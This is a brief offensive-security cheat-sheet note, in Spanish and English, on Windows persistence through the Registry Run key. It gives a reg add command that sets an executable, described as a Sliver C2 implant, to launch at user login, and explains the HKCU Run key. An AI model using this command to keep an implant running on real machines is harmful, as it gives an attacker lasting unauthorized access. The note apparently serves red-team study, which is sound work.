## Resgistry Run Keys 

Tags: #RegistryRunKeys #Persistencia 

```bash 
- Reg - utility
- Add, remove, query registry keys
- Execute on login 

# Ejecutar como administrador 
# Esto funcionará cuando se hace un 'sign out' y se vuelva a iniciar sesión 
❯ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Test" /t REG_SZ /d "C:\Users\user1\persistence.exe" /f
	# v = Nombre del registro 
	# d = Ruta del ejecutable (Implante de Sliver C2)


NOTAS:
	- The path to the registry key is: HKCU\Software\Microsoft\Windows\CurrentVersion\Run.
		* HKCU: This stands for HKEY_CURRENT_USER. A key placed here will only execute for the currently logged-in user.
		* Run: This specific key is designed for applications to run at user login
```